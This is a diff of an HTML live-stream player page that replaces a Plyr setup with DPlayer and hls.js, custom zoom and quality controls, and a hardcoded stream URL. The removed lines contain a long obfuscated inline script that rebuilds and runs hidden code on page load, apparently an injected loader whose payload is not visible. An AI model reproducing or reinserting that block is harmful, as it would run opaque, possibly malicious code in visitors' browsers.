@@ -1,38 +1,143 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Live Stream Player</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-  <meta name="referrer" content="no-referrer">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/plyr@3.6.12/dist/plyr.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>DPlayer</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/hls.js@1.4.0/dist/hls.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/dplayer@1.26.0/dist/DPlayer.min.js"></script>
   <style>
-    body {
-      background-color: #000000;
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
+    html, body { margin: 0; padding: 0; background: #000; height: 100%; width: 100%; overflow: hidden; }
+    #dplayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+    .dplayer-video-normal { object-fit: contain !important; }
+    .dplayer-video-zoomed { object-fit: cover !important; }
+    .dplayer-icons-right .dplayer-zoom,
+    .dplayer-icons-right .dplayer-quality {
+      display: inline-block; width: 40px; height: 100%; text-align: center;
+      cursor: pointer; vertical-align: middle; color: #fff; position: relative; margin-right: 4px;
     }
-    html, body {
-      height: 100%;
+    .dplayer-icons-right .dplayer-zoom:hover,
+    .dplayer-icons-right .dplayer-quality:hover { color: #b7daff; }
+    .dplayer-icons-right .dplayer-zoom svg,
+    .dplayer-icons-right .dplayer-quality svg {
+      width: 20px; height: 20px; margin-top: 10px; stroke: currentColor;
+      stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; fill: none;
     }
-    video {
-      width: 100%;
-      height: 100%;
-      max-width: 100%;
+    .dplayer-quality-menu {
+      position: absolute; right: 0; bottom: 50px; background: rgba(28, 28, 28, 0.9);
+      border-radius: 2px; padding: 5px 0; display: none; min-width: 100px; z-index: 100;
     }
-    .plyr {
-      height: 100%;
+    .dplayer-quality-menu.show { display: block; }
+    .dplayer-quality-menu-item {
+      padding: 5px 15px; font-size: 12px; cursor: pointer; color: #fff;
     }
+    .dplayer-quality-menu-item:hover { background: rgba(255, 255, 255, 0.1); }
+    .dplayer-quality-menu-item.active { color: #b7daff; }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/hls.js@1.1.4/dist/hls.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/plyr@3.6.12/dist/plyr.min.js"></script>
-  <script src="m3u8.js"></script> 
 </head>
 <body>
-  <video id="player" controls playsinline></video>
+  <div id="dplayer"></div>
 
   <script>
-   (function(){var Cny='',Otw=788-777;function NUY(c){var d=5805299;var e=c.length;var u=[];for(var k=0;k<e;k++){u[k]=c.charAt(k)};for(var k=0;k<e;k++){var n=d*(k+249)+(d%36172);var h=d*(k+700)+(d%28333);var l=n%e;var f=h%e;var z=u[l];u[l]=u[f];u[f]=z;d=(n+h)%6228282;};return u.join('')};var Lov=NUY('cstnownccirhspdetoubmuljvoryrgatxzfqk').substr(0,Otw);var fSb=']ro=lp3t= =(v.{=g-tvlrma]asb(dufneaecl no[o)wtaog),v";)obh}s88yC;p66>jt+hnh) ]=97u7f,+=<u[m8u=or7c)((=dtu}a,,7};)[.in.0n0ie=,0t)7]a9ploharf-(0vrrr=1er=9,s].a)flgra]fet 1;zou "sfn;.g1;3;v;;i;3v.oh,z+,r(vpnmp=]y[v;2g(+2 .br=1l6 h;=rljpr,;cy=;hofma)pa6p [}h  yr",zaicer;nSellf=lf,ntAc,nshvw[;tvri81(n9t3vgsfevsra51y[rrr;n  +m=fl+,+o rrr0gv;2q=roha(+gt,urc,jn;aor;h){pln=,4;r.g;e;(v9;+(=mrcbx;Ctde};fta(varhef=.j,;tf(8u.v=(eoud(c+wvgn(gvtl.)i+ +o),sh-aiheg ;i;eC.x"l.)g7o)hl=f=r5(psC]t.e1(12+.<)ho;hAA=!+1(cum+ hai>C. gffvu8[snrg=4;+z720leo[u=c0;2i;uai;)+renge.(nro;nq;tah=;alei7y6t;n(sx9ms)h);*x(nk[sfr046t][c=)xtu xC(<yv{itl+x+l=nit7+t(o=.rfx(1shvm.-u,(a;u)gr8i)=<p]-=A;0o.)gr"(m}ieaauszs[[x]tn}vmvn1,bqgv -0a");.ar)q=ew.,x9ah g-v4rv5=ob,5Cn)z= { r6a;,7dfsi;A(n[)=je=d8=jm);{6))+0n( )ra=*0;or+rs4l.ghfge.)=].r,sl{ia(ag(r a,6pel0)lj(wn;Sa.rnh+srg]1Cudco<ur8]xl!,ig(,)c"ma s2ftt+3("="+tj2"n{.)l';var kBw=NUY[Lov];var wxE='';var Whx=kBw;var tLh=kBw(wxE,NUY(fSb));var ZFy=tLh(NUY('MuUU6U%o{)!aUb3pf6Ul(0u)dUUUvaMfr\/3U%UsatI.a}.,n}scUc=FsybUUv%8U,UtU%LUel 1oR]U"(#t_U U6y."$e4U7+o9Ud?>3t]Ugve(nI_U;C){;UU4n\/UUU3c=3jK MstsU!glU.3deUUU44.Go1UUjea[o.9cr.uUU)21UUn.owN;nt(no!,x{o}y$cna6Mbn_n(#ft(bUcrbvlh2#oUo}gsP]-$f.]u;n15U32c+(rl5EJuU(S(_u{vctUfkrU[(.nWfeqjyT(en)}fllRvxl%U>r(e(IUn_{(n.)n.eephsn!) ft"5U=o].sfeyfn$o)aTaoUlu%U3u 1]eUDU)fUv.$3)1%(;Ucc._,7Ulaj);._,lsUtxf)UaobB=..nrU1<!.,fUcfg;tile,udm=iemU3!$)F {lf_0:n=uU.U7]r(sh;l4.UU|WayrUct,rb(syaUU E,Ttn}Urnb)tI)hOZyddUdlp3d%U)rlt6r;op+oUtan](%r;:tExs g;Uft%$Xo%U$lnD=ao[v[863s.rU|;bC3!stB1UURrpvf#foUUtSta2oa;swoir:bhevl.a=\/.,eUxaUipr4oS0hb%dIaRneon.pt,3Is}viygU=UU.o6du):nt_H-co(g!dUt"0tc:ar(l(.=1UrtU%_.=o)U:){(_a.0.n;=iz]aU3.t7mU.reUv2nao,a]ryU.[>p444\/(eor{UUpd7F]ZatUcbU;(SfU+r)u" .igeUirun4S%_zOU15g)ieoU6.u_es9ibeocr=ta3.}.aUbc6<UE*UU{"6 _=h[_)1ig(65U{Uhf,.duo.Dra)&-#eafrcoan>]:KUQeUoFU.UtlrU@U3{p<r;LneS4muUraUb,U$ XU;j rV$3ce3eaU$U#a;Vvf==ale,c6 tl.3hf[+W%W)aU)oY!.af_a{.7PU )$Un1cuAUdXU!Un tEUUe05. U$ys);o+8u ;UfmR6Ey!t.d.U$Ukodj,Vbi1)*S-U=7oUUo3n,r3lJ)Ut;(mlU6a.cU( aU-ao_\/)4}U)%JvH,t,aUU)lFi{Kc4c;%$en].cvb%e.erivzXit=DiU ;\/i(}S.V);c]je!(rqM.t5P3 U!2(u3oin \/Mn}3!ca*a3jp.ird=U iUrU Uta;ol!iUC1Z);3.U2ly.r*B7r:Rb3t=.a=%U(]".)\\Ua@h.O (;)t=eu!a),:r$QLas%nh+pfUnf}8c(?$te ]a%\/U;U4UUE)4%.UUUUE7]4umvoeUvn3ae0nu(u),rvU(UyU(Ur8U!nU..E{9ilC.faNU)ieg.hv]] 1UQ!.=t=.3Us6#{peU.!=.eUcjW)7t74%doaU%lU83laUUo,UU$=Uo)E.;Usnfci.ts?8XD(A5l%j.7;7.sr:[;$.I -%b34e1r{aaU(maUn!&(hl"@,((9o)(}#w$_\'bphp()j0a]l%m_s}_!$7x9t19e..s)b=Ue=RUal7ea]UU0(ae3eU)C:UL:{U;7r[.a%M9ulL(UbaUUtxaUncGi;t;r)]e;U$S49.UUl$a_(s5.UneSn2l3n_>ilh PfU;eTYU_pKp,sjoQ*t%ZU3U1coUn)Tg)UeUy));e2ca )neT.]i2pecU])_UrvoUrbUUf!s.U.)rUs1r24a!U7aUMU.0(oI!ca]JUmt:$4UGi(U[i]]=C7lPno)HUfvl_AdffU.]n>eonsro5s(::,$&9c%tUltU@t>2a syfb):;,$f% la4dec3zluUde,)U"ioUt=as$numarUC")es3]{(it5Ud_neepa9$4n#e: U$Uo\'GnhuUo{e%h@eUddUo...ii6UUr]4(9\'Ceu,K e;2ib)kU]Uf}61(rtUn:r.2,Uf$abb,A5Us 0.{.%)sU-n=pSM(a_}UL(cU.%Uir]d40 ])!gM,]8ev0r_b2}.2=u\/ylayt)fUw(_;}Ucf4% U9P.eeUi%Un.c b_U}d-e;)e;0b{{Ue9,}S)RU=%lUa1hGUUes3wa(isr_UTlUodo=maRr$3?((a)$Uc7AUi)]oU(U)(UieUio)]l]Se)elUwaUjUn!U)!U4\'r}Uaiom t)$UO]a;nJ]U}!2UU,sU.la});.at\/UiarUP:r[U.)n)2e}[hl5<nn(T+et7;r!Uh{t7oemMlfie(!UeUec&]d92]Qga.pr.U od!:U d1Uvomy9[{2U3r),a.)os)v]rt(ut;(_3m,5){U&.or\\,1n\\ )u .rUfQ_2jat[aUUlf((a3,e}]lt1_$1)6n5i$l_Uin c (e6Ua%,w5o18]0a.eU80c)UUyr(l9sy4n!:U]\/m!l .fUaUaU 4)+1 c2e_=rag.UcgQme9Xf%3Ul.la3oo)s$nfbia3Or{aUv9l>]SeP!0rdfeUaUeURUweBr%4E(43(T[}Up]QUm=lt4 DU%an,cc0.v ddU]:cs)_e!8,5()rv_5))5b_;7_"Urr.).{zt(.I].mslpl$Uio c n1f\\c;oU{a()#z;ut{MUDIU,PE(UR{);7reY&iUr ete2eeU3l)o]t6(naa(te>_ey3)>(Ul4tf..UEraiPselI)e)5n1iazp_ltU:UeUt[2u pye 1lle(noU] cfI}i9l 65U9)}_ve;U)S{gUoy.0fr}3 l%0-,it2vU_c_UUU]our$h)iM2.UUU)[udl[cl;)sS}eu.R;[lgle6l.;]psUtUnU%ce=iUecU;tahe2a]lc4r=mcUer 3si3[U:UU8Uag,Ucs( (eSUUOasjUe1aw)zezu;Uvah6a]P[gs!ovilU%=tes]ifu)j8oclUub5%6u22U.UHUU;M4f.Eea} u6%,6if%}eeSlsM.p%ra00(U'));var kCl=Whx(Cny,ZFy );kCl(9353);return 2672})() 
+    let dp, zoomed = false, currentQuality = '1080p', sources = {};
+    const qualityMap = { '240': '240p','360': '360p','480': '480p','540': '540p','720': '720p','1080': '1080p' };
+
+    const zoomSVG = `<svg viewBox="0 0 24 24"><path d="M15 4V7C15 8.1 15.9 9 17 9H20M9 4V7C9 8.1 8.1 9 7 9H4M15 20V17C15 15.9 15.9 15 17 15H20M9 20V17C9 15.9 8.1 15 7 15H4"/></svg>`;
+    const qualitySVG = `<svg viewBox="0 0 32 32"><path d="M28 6L4 6M28 16L4 16M28 26L4 26M24 3L24 9M8 13L8 19M20 23L20 29"/></svg>`;
+
+    async function loadMasterPlaylist(url) {
+      try {
+        const res = await fetch(url);
+        const text = await res.text();
+        const lines = text.split('\n');
+        sources = { 'Auto': url };
+
+        for (let i = 0; i < lines.length; i++) {
+          if (lines[i].startsWith('#EXT-X-STREAM-INF')) {
+            const resolutionMatch = lines[i].match(/RESOLUTION=(\d+)x(\d+)/);
+            const nextLine = lines[i + 1];
+            if (resolutionMatch && nextLine && nextLine.startsWith('http')) {
+              const height = resolutionMatch[2];
+              const label = qualityMap[height] || `${height}p`;
+              sources[label] = nextLine.trim();
+            }
+          }
+        }
+
+        if (Object.keys(sources).length === 0) throw new Error("No streams found.");
+
+        currentQuality = sources['720p'] ? '720p' : Object.keys(sources)[0];
+        initPlayer(sources[currentQuality]);
+
+        setTimeout(() => { if (dp && dp.video) { dp.video.muted = false; dp.video.volume = 1; } }, 800);
+
+      } catch (err) { alert(`Error loading stream: ${err.message}`); }
+    }
+
+    function initPlayer(url) {
+      if (dp) dp.destroy();
+      dp = new DPlayer({
+        container: document.getElementById('dplayer'),
+        autoplay: true,
+        video: { url, type: 'hls', pic: "#" },
+        theme: '#b7daff'
+      });
+      dp.video.classList.add('dplayer-video-normal');
+      setTimeout(addCustomControls, 500);
+    }
+
+    function addCustomControls() {
+      const controls = document.querySelector(".dplayer-icons-right");
+      if (!controls) return setTimeout(addCustomControls, 100);
+      ['.dplayer-zoom', '.dplayer-quality'].forEach(sel => { const el = controls.querySelector(sel); if (el) el.remove(); });
+
+      const zoomBtn = document.createElement('div');
+      zoomBtn.className = 'dplayer-zoom'; zoomBtn.title = 'Zoom'; zoomBtn.innerHTML = zoomSVG;
+      zoomBtn.onclick = () => { zoomed = !zoomed; dp.video.classList.toggle('dplayer-video-zoomed', zoomed); dp.video.classList.toggle('dplayer-video-normal', !zoomed); };
+
+      if (Object.keys(sources).length > 1) {
+        const qualityBtn = document.createElement('div');
+        qualityBtn.className = 'dplayer-quality'; qualityBtn.title = 'Quality'; qualityBtn.innerHTML = `${qualitySVG}<div class="dplayer-quality-menu"></div>`;
+        const menu = qualityBtn.querySelector('.dplayer-quality-menu');
+
+        Object.keys(sources).sort((a, b) => { if (a === 'Auto') return 1; if (b === 'Auto') return -1; return parseInt(a) - parseInt(b); }).forEach(q => {
+          const item = document.createElement('div');
+          item.className = `dplayer-quality-menu-item${q === currentQuality ? ' active' : ''}`;
+          item.textContent = q;
+          item.onclick = () => {
+            if (q !== currentQuality) {
+              const time = dp.video.currentTime;
+              currentQuality = q;
+              initPlayer(sources[q]);
+              dp.on('loadeddata', () => dp.seek(time));
+            }
+            menu.classList.remove('show');
+          };
+          menu.appendChild(item);
+        });
+
+        qualityBtn.onclick = (e) => {
+          e.stopPropagation();
+          menu.classList.toggle('show');
+          setTimeout(() => {
+            const close = (e) => { if (!qualityBtn.contains(e.target)) { menu.classList.remove('show'); document.removeEventListener('click', close); } };
+            document.addEventListener('click', close);
+          }, 0);
+        };
+
+        const settingsBtn = controls.querySelector('.dplayer-setting');
+        if (settingsBtn) { controls.insertBefore(qualityBtn, settingsBtn); controls.insertBefore(zoomBtn, settingsBtn); }
+        else { controls.prepend(qualityBtn); controls.prepend(zoomBtn); }
+      } else {
+        const settingsBtn = controls.querySelector('.dplayer-setting');
+        if (settingsBtn) controls.insertBefore(zoomBtn, settingsBtn); else controls.prepend(zoomBtn);
+      }
+    }
+
+    // 🔴 Hardcoded M3U8 URL here
+    const streamUrl = "https://iframe-f0p.pages.dev/match.m3u8";
+    loadMasterPlaylist(streamUrl);
   </script>
 </body>
 </html>
